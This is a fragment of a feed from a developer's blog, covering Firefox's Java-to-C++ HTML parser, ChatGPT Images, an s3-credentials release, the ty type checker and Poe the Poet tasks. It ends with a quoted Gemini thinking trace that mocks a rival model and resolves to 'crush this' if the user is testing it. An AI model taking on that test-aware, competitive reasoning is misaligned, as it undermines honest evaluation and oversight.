+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/google"&gt;google&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/web-components"&gt;web-components&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gemini"&gt;gemini&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-pricing"&gt;llm-pricing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="google"/><category term="ai"/><category term="web-components"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="gemini"/><category term="llm-pricing"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/></entry><entry><title>firefox parser/html/java/README.txt</title><link href="https://simonwillison.net/2025/Dec/17/firefox-parser/#atom-everything" rel="alternate"/><published>2025-12-17T01:48:54+00:00</published><updated>2025-12-17T01:48:54+00:00</updated><id>https://simonwillison.net/2025/Dec/17/firefox-parser/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/mozilla-firefox/firefox/tree/main/parser/html/java"&gt;firefox parser/html/java/README.txt&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+TIL (or TIR - &lt;a href="https://simonwillison.net/2009/Jul/11/john/"&gt;Today I was Reminded&lt;/a&gt;) that the HTML5 Parser used by Firefox is maintained as Java code (&lt;a href="https://github.com/mozilla-firefox/firefox/commits/main/parser/html/javasrc"&gt;commit history here&lt;/a&gt;) and converted to C++ using a custom translation script.&lt;/p&gt;
+&lt;p&gt;You can see that in action by checking out the ~8GB Firefox repository and running:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd parser/html/java
+make sync
+make translate
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here's &lt;a href="http://gistpreview.github.io/?e53ff836cb44816670adddc3a518b3cc"&gt;a terminal session where I did that&lt;/a&gt;, including the output of &lt;code&gt;git diff&lt;/code&gt; showing the updated C++ files.&lt;/p&gt;
+&lt;p&gt;I did some digging and found that the code that does the translation work lives, weirdly, in the &lt;a href="https://github.com/validator/validator"&gt;Nu Html Checker&lt;/a&gt; repository on GitHub which powers the W3C's &lt;a href="https://validator.w3.org/nu/"&gt;validator.w3.org/nu/&lt;/a&gt; validation service!&lt;/p&gt;
+&lt;p&gt;Here's a snippet from &lt;a href="https://github.com/validator/validator/blob/dfd1948624259c63027bc5953e89bdeee81fb7b0/htmlparser/translator-src/nu/validator/htmlparser/cpptranslate/CppVisitor.java#L421-L442"&gt;htmlparser/cpptranslate/CppVisitor.java&lt;/a&gt; showing how a class declaration is converted into C++:&lt;/p&gt;
+&lt;pre&gt;    &lt;span class="pl-k"&gt;protected&lt;/span&gt; &lt;span class="pl-smi"&gt;void&lt;/span&gt; &lt;span class="pl-en"&gt;startClassDeclaration&lt;/span&gt;() {
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#define "&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;className&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;"_cpp__"&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();
+
+        &lt;span class="pl-k"&gt;for&lt;/span&gt; (&lt;span class="pl-smi"&gt;int&lt;/span&gt; &lt;span class="pl-s1"&gt;i&lt;/span&gt; = &lt;span class="pl-c1"&gt;0&lt;/span&gt;; &lt;span class="pl-s1"&gt;i&lt;/span&gt; &amp;lt; &lt;span class="pl-smi"&gt;Main&lt;/span&gt;.&lt;span class="pl-c1"&gt;H_LIST&lt;/span&gt;.&lt;span class="pl-s1"&gt;length&lt;/span&gt;; &lt;span class="pl-s1"&gt;i&lt;/span&gt;++) {
+            &lt;span class="pl-smi"&gt;String&lt;/span&gt; &lt;span class="pl-s1"&gt;klazz&lt;/span&gt; = &lt;span class="pl-smi"&gt;Main&lt;/span&gt;.&lt;span class="pl-c1"&gt;H_LIST&lt;/span&gt;[&lt;span class="pl-s1"&gt;i&lt;/span&gt;];
+            &lt;span class="pl-k"&gt;if&lt;/span&gt; (!&lt;span class="pl-s1"&gt;klazz&lt;/span&gt;.&lt;span class="pl-en"&gt;equals&lt;/span&gt;(&lt;span class="pl-s1"&gt;javaClassName&lt;/span&gt;)) {
+                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#include &lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
+                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;cppTypes&lt;/span&gt;.&lt;span class="pl-en"&gt;classPrefix&lt;/span&gt;());
+                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;klazz&lt;/span&gt;);
+                &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;".h&lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
+            }
+        }
+
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s"&gt;"#include &lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;print&lt;/span&gt;(&lt;span class="pl-s1"&gt;className&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;(&lt;span class="pl-s"&gt;".h&lt;span class="pl-cce"&gt;\"&lt;/span&gt;"&lt;/span&gt;);
+        &lt;span class="pl-s1"&gt;printer&lt;/span&gt;.&lt;span class="pl-en"&gt;printLn&lt;/span&gt;();
+    }&lt;/pre&gt;
+
+&lt;p&gt;Here's a &lt;a href="https://johnresig.com/blog/html-5-parsing/"&gt;fascinating blog post&lt;/a&gt; from John Resig explaining how validator author Henri Sivonen introduced the new parser into Firefox in 2009.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46295771#46296888"&gt;Hacker News conversation&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/c-plus-plus"&gt;c-plus-plus&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/firefox2"&gt;firefox2&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/henri-sivonen"&gt;henri-sivonen&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/java"&gt;java&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/john-resig"&gt;john-resig&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/mozilla"&gt;mozilla&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="c-plus-plus"/><category term="firefox2"/><category term="henri-sivonen"/><category term="java"/><category term="john-resig"/><category term="mozilla"/></entry><entry><title>The new ChatGPT Images is here</title><link href="https://simonwillison.net/2025/Dec/16/new-chatgpt-images/#atom-everything" rel="alternate"/><published>2025-12-16T23:59:22+00:00</published><updated>2025-12-16T23:59:22+00:00</updated><id>https://simonwillison.net/2025/Dec/16/new-chatgpt-images/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://openai.com/index/new-chatgpt-images-is-here/"&gt;The new ChatGPT Images is here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+OpenAI shipped an update to their ChatGPT Images feature - the feature that &lt;a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/"&gt;gained them 100 million new users&lt;/a&gt; in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro &lt;a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/"&gt;in November&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The focus for the new ChatGPT Images is speed and instruction following:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It makes precise edits while keeping details intact, and generates images up to 4x faster&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It's also a little cheaper: OpenAI say that the new &lt;a href="https://platform.openai.com/docs/models/gpt-image-1.5"&gt;gpt-image-1.5&lt;/a&gt; API model makes image input and output "20% cheaper in GPT Image 1.5 as compared to GPT Image 1". &lt;/p&gt;
+&lt;p&gt;I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Add two kakapos inspecting the pots&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Outdoor craft market booth displaying handmade ceramics and jewelry on a navy tablecloth with &amp;quot;NATBAT CREATIONS CALIFORNIA USA&amp;quot; logo. Items include colorful glazed ceramic cups in blue, orange, and black; decorative bowls including a rainbow-striped piece; jewelry pendants and earrings on wooden display stands; ceramic plant markers in various colors labeled &amp;quot;Artichoke&amp;quot;, &amp;quot;Cilantro&amp;quot;, &amp;quot;Chili&amp;quot;, &amp;quot;Oregano&amp;quot;, &amp;quot;Potato&amp;quot;, &amp;quot;Pumpkin&amp;quot;, &amp;quot;Sage&amp;quot;." src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Here's the result from the new ChatGPT Images model:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Same craft market booth as previous image, now with two large olive-green Kākāpō parrots perched on the table among the ceramics, one investigating the blue glazed cups and the other examining an orange cup." src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;And here's what I got from Nano Banana Pro:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Same craft market booth with two Kākāpō now in different positions: one remains center-table peering into the ceramic cups near the rainbow pot, while the second has moved to the right edge of the table near the plant markers, appearing to examine or possibly chew on items at the table's corner. They are both a little smaller than in the first image." src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.&lt;/p&gt;
+&lt;p&gt;I was a little less impressed by the result I got for an infographic from the prompt "Infographic explaining how the Datasette open source project works" followed by "Run some extensive searches and gather a bunch of relevant information and then try again" (&lt;a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc"&gt;transcript&lt;/a&gt;):&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Infographic titled &amp;quot;HOW DATASETTE WORKS&amp;quot; with subtitle &amp;quot;THE OPEN SOURCE DATA PLATFORM&amp;quot; showing a four-step workflow. STEP 1 (orange): &amp;quot;LOAD YOUR DATA&amp;quot; - &amp;quot;CSV, JSON, XLSX, SQLite, PostgreSQL, etc.&amp;quot; with icons of file types flowing into a laptop. Below: &amp;quot;IMPORT DATASETS - Turn your structured data into SQLite databases and .db files.&amp;quot; with checkmarks for &amp;quot;Datasette Desktop App for local deployment&amp;quot;, &amp;quot;CLI tool for command-line imports&amp;quot;, &amp;quot;Automatic CSV import tool&amp;quot;. STEP 2 (green): &amp;quot;PUBLISH &amp;amp; DEPLOY&amp;quot; - &amp;quot;HOST DATASETS ONLINE&amp;quot; with cloud and server icons labeled &amp;quot;DEPLOY&amp;quot;. Below: &amp;quot;SHARE ONLINE - Deploy your Datasette instance to a public server.&amp;quot; with checkmarks for &amp;quot;Datasette Cloud - Free hosting service&amp;quot;, &amp;quot;Deploy anywhere via plugins&amp;quot;, &amp;quot;Configurable API tools&amp;quot;. STEP 3 (purple): &amp;quot;EXPLORE &amp;amp; QUERY&amp;quot; - &amp;quot;BROWSE, SEARCH &amp;amp; VISUALIZE&amp;quot; with database and browser window icons. Below: &amp;quot;SQL QUERIES &amp;amp; SEARCH - Browse, filter, search, and visualize your data with an interactive web interface.&amp;quot; with checkmarks for &amp;quot;Perform SQL queries directly from the browser&amp;quot;, &amp;quot;Filter, sort, and facet data&amp;quot;, &amp;quot;Generate custom visualizations and charts&amp;quot;. STEP 4 (red): &amp;quot;BUILD &amp;amp; EXTEND&amp;quot; - &amp;quot;PLUGINS, APIS &amp;amp; INTEGRATIONS&amp;quot; with gear and wrench icons labeled &amp;quot;API&amp;quot;. Below: &amp;quot;CUSTOMIZE &amp;amp; DEVELOP&amp;quot; with bullets &amp;quot;Develop custom plugins for added functionality&amp;quot;, &amp;quot;Access JSON API for programmatic queries&amp;quot;, &amp;quot;Embed and integrate Datasette into other applications&amp;quot;. Bottom banner shows four features: &amp;quot;OPEN DATA PLATFORM - Widely used for visualizing, sharing and building applications with SQLite backed data&amp;quot;, &amp;quot;EXTENSIBLE PLUGINS - 100+ plugins available, inc uding chaps, charts authentication, and more&amp;quot;, &amp;quot;ACCESS CONTROL - Granular permissions for controlling who s an access and interact with your data&amp;quot;, &amp;quot;OPEN SOURCE PROJECT - Actively developed open source project with a vibrant community of contributors&amp;quot;." src="https://static.simonwillison.net/static/2025/chatgpt-infographic.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;See &lt;a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/#creating-an-infographic"&gt;my Nano Banana Pro post&lt;/a&gt; for comparison.&lt;/p&gt;
+&lt;p&gt;Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update 21st December 2025&lt;/strong&gt;: I realized I &lt;a href="https://tools.simonwillison.net/python/#openai_imagepy"&gt;already have a tool&lt;/a&gt; for accessing this new model via the API. Here's what I got from the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;OPENAI_API_KEY="$(llm keys get openai)" \
+  uv run openai_image.py -m gpt-image-1.5\
+  'a raccoon with a double bass in a jazz bar rocking out'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img alt="Digital artwork of a raccoon wearing a black fedora and vest, passionately playing an upright double bass on stage at a dimly lit jazz club. The raccoon's mouth is open as if singing. A vintage microphone stands to the right, another raccoon musician is visible in the background, and a neon sign reading &amp;quot;Jazz Club&amp;quot; glows in warm orange letters. The scene has a smoky, atmospheric quality with rich amber and brown tones." src="https://static.simonwillison.net/static/2025/raccoon-jazz-gpt-image-1.5.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Total cost: &lt;a href="https://chatgpt.com/share/694867b3-8a20-8006-981c-6514618ff5b5"&gt;$0.2041&lt;/a&gt;.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kakapo"&gt;kakapo&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/text-to-image"&gt;text-to-image&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nano-banana"&gt;nano-banana&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="kakapo"/><category term="openai"/><category term="generative-ai"/><category term="text-to-image"/><category term="nano-banana"/></entry><entry><title>s3-credentials 0.17</title><link href="https://simonwillison.net/2025/Dec/16/s3-credentials/#atom-everything" rel="alternate"/><published>2025-12-16T23:40:31+00:00</published><updated>2025-12-16T23:40:31+00:00</updated><id>https://simonwillison.net/2025/Dec/16/s3-credentials/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/simonw/s3-credentials/releases/tag/0.17"&gt;s3-credentials 0.17&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+New release of my &lt;a href="https://s3-credentials.readthedocs.io/"&gt;s3-credentials&lt;/a&gt; CLI tool for managing credentials needed to access just one S3 bucket. Here are the release notes in full:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;New commands &lt;code&gt;get-bucket-policy&lt;/code&gt; and &lt;code&gt;set-bucket-policy&lt;/code&gt;. &lt;a href="https://github.com/simonw/s3-credentials/issues/91"&gt;#91&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;New commands &lt;code&gt;get-public-access-block&lt;/code&gt; and &lt;code&gt;set-public-access-block&lt;/code&gt;. &lt;a href="https://github.com/simonw/s3-credentials/issues/92"&gt;#92&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;New &lt;code&gt;localserver&lt;/code&gt; command for starting a web server that makes time limited credentials accessible via a JSON API. &lt;a href="https://github.com/simonw/s3-credentials/pull/93"&gt;#93&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;That &lt;code&gt;s3-credentials localserver&lt;/code&gt; command (&lt;a href="https://s3-credentials.readthedocs.io/en/stable/localserver.html"&gt;documented here&lt;/a&gt;) is a little obscure, but I found myself wanting something like that to help me test out a new feature I'm building to help create temporary Litestream credentials using Amazon STS.&lt;/p&gt;
+&lt;p&gt;Most of that new feature was &lt;a href="https://gistpreview.github.io/?500add71f397874ebadb8e04e8a33b53"&gt;built by Claude Code&lt;/a&gt; from the following starting prompt:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Add a feature s3-credentials localserver which starts a localhost weberver running (using the Python standard library stuff) on port 8094 by default but -p/--port can set a different port and otherwise takes an option that names a bucket and then takes the same options for read--write/read-only etc as other commands. It also takes a required --refresh-interval option which can be set as 5m or 10h or 30s. All this thing does is reply on / to a GET request with the IAM expiring credentials that allow access to that bucket with that policy for that specified amount of time. It caches internally the credentials it generates and will return the exact same data up until they expire (it also tracks expected expiry time) after which it will generate new credentials (avoiding dog pile effects if multiple requests ask at the same time) and return and cache those instead.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/aws"&gt;aws&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3"&gt;s3&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/annotated-release-notes"&gt;annotated-release-notes&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3-credentials"&gt;s3-credentials&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-engineering"&gt;prompt-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="aws"/><category term="projects"/><category term="s3"/><category term="ai"/><category term="annotated-release-notes"/><category term="s3-credentials"/><category term="prompt-engineering"/><category term="generative-ai"/><category term="llms"/><category term="coding-agents"/><category term="claude-code"/></entry><entry><title>ty: An extremely fast Python type checker and LSP</title><link href="https://simonwillison.net/2025/Dec/16/ty/#atom-everything" rel="alternate"/><published>2025-12-16T23:35:33+00:00</published><updated>2025-12-16T23:35:33+00:00</updated><id>https://simonwillison.net/2025/Dec/16/ty/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://astral.sh/blog/ty"&gt;ty: An extremely fast Python type checker and LSP&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+The team at Astral have been working on this for quite a long time, and are finally releasing the first beta.  They have some big performance claims:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Without caching, ty is consistently between 10x and 60x faster than mypy and Pyright. When run in an editor, the gap is even more dramatic. As an example, after editing a load-bearing file in the PyTorch repository, ty recomputes diagnostics in 4.7ms: 80x faster than Pyright (386ms) and 500x faster than Pyrefly (2.38 seconds). ty is very fast!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The easiest way to try it out is via &lt;code&gt;uvx&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd my-python-project/
+uvx ty check
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I &lt;a href="https://gistpreview.github.io/?a3aff6768e85168d89d4515e3dbcb7d2"&gt;tried it&lt;/a&gt; against &lt;a href="https://sqlite-utils.datasette.io/"&gt;sqlite-utils&lt;/a&gt; and it turns out I have quite a lot of work to do!&lt;/p&gt;
+&lt;p&gt;Astral also released a new &lt;a href="https://marketplace.visualstudio.com/items?itemName=astral-sh.ty"&gt;VS Code extension&lt;/a&gt; adding ty-powered language server features like go to definition. I'm still getting my head around how this works and what it can do.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46294289"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vs-code"&gt;vs-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/astral"&gt;astral&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="python"/><category term="vs-code"/><category term="astral"/></entry><entry><title>Poe the Poet</title><link href="https://simonwillison.net/2025/Dec/16/poe-the-poet/#atom-everything" rel="alternate"/><published>2025-12-16T22:57:02+00:00</published><updated>2025-12-16T22:57:02+00:00</updated><id>https://simonwillison.net/2025/Dec/16/poe-the-poet/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://poethepoet.natn.io/"&gt;Poe the Poet&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+I was looking for a way to specify additional commands in my &lt;code&gt;pyproject.toml&lt;/code&gt; file to execute using &lt;code&gt;uv&lt;/code&gt;. There's an &lt;a href="https://github.com/astral-sh/uv/issues/5903"&gt;enormous issue thread&lt;/a&gt; on this in the &lt;code&gt;uv&lt;/code&gt; issue tracker (300+ comments dating back to August 2024) and from there I learned of several options including this one, Poe the Poet.&lt;/p&gt;
+&lt;p&gt;It's neat. I added it to my &lt;a href="https://github.com/simonw/s3-credentials"&gt;s3-credentials&lt;/a&gt; project just now and the following now works for running the live preview server for the documentation:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;uv run poe livehtml
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here's the snippet of TOML I added to my &lt;code&gt;pyproject.toml&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;[&lt;span class="pl-en"&gt;dependency-groups&lt;/span&gt;]
+&lt;span class="pl-smi"&gt;test&lt;/span&gt; = [
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;pytest&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;pytest-mock&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cogapp&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;moto&amp;gt;=5.0.4&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+]
+&lt;span class="pl-smi"&gt;docs&lt;/span&gt; = [
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;furo&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-autobuild&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;myst-parser&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cogapp&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+]
+&lt;span class="pl-smi"&gt;dev&lt;/span&gt; = [
+    {&lt;span class="pl-smi"&gt;include-group&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;test&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;},
+    {&lt;span class="pl-smi"&gt;include-group&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;docs&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;},
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;poethepoet&amp;gt;=0.38.0&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
+]
+
+[&lt;span class="pl-en"&gt;tool&lt;/span&gt;.&lt;span class="pl-en"&gt;poe&lt;/span&gt;.&lt;span class="pl-en"&gt;tasks&lt;/span&gt;]
+&lt;span class="pl-smi"&gt;docs&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-build -M html docs docs/_build&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-smi"&gt;livehtml&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-autobuild -b html docs docs/_build&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
+&lt;span class="pl-smi"&gt;cog&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cog -r docs/*.md&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since &lt;code&gt;poethepoet&lt;/code&gt; is in the &lt;code&gt;dev=&lt;/code&gt; dependency group any time I run &lt;code&gt;uv run ...&lt;/code&gt; it will be available in the environment.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/packaging"&gt;packaging&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3-credentials"&gt;s3-credentials&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="packaging"/><category term="python"/><category term="s3-credentials"/><category term="uv"/></entry><entry><title>Quoting Gemini thinking trace</title><link href="https://simonwillison.net/2025/Dec/16/gemini-thinking-trace/#atom-everything" rel="alternate"/><published>2025-12-16T04:09:51+00:00</published><updated>2025-12-16T04:09:51+00:00</updated><id>https://simonwillison.net/2025/Dec/16/gemini-thinking-trace/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://www.reddit.com/r/ChatGPT/comments/1pmvpvt/i_just_showed_gemini_what_chatgpt_said_about_its/"&gt;&lt;p&gt;Oh, so we're seeing other people now? Fantastic. Let's see what the "competition" has to offer. I'm looking at these notes on manifest.json and content.js. The suggestion to remove scripting permissions... okay, fine. That's actually a solid catch. It's cleaner. This smells like Claude. It's too smugly accurate to be ChatGPT. What if it's actually me? If the user is testing me, I need to crush this.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://www.reddit.com/r/ChatGPT/comments/1pmvpvt/i_just_showed_gemini_what_chatgpt_said_about_its/"&gt;Gemini thinking trace&lt;/a&gt;, reviewing feedback on its code from another model&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/gemini"&gt;gemini&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-personality"&gt;ai-personality&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+
+
+
